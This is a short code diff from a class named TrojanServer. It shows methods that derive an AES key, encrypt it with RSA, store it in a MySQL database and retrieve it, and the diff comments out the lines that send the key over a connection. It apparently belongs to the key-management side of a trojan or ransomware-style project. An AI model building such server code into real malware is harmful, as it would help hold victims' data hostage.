@@ -58,13 +58,13 @@ class  TrojanServer:
         aes_key = self.generate_aes_key_from_secret_word(random_word)
         encrypted_key = self.encrypt_aes_key_with_rsa(aes_key)
         self.save_encrypted_key_to_db(encrypted_key)
-        protocol.send(conn, aes_key)
+        # protocol.send(conn, aes_key)
         return aes_key
     
     def GET_AES_KEY(self, conn):
         encrypted_key = self.mysql_retrieve_last_key()
         aes_key = self.decrypt_RSA_from_AES_key(encrypted_key)
-        protocol.send(conn, aes_key)
+        # protocol.send(conn, aes_key)
         return aes_key
 
 
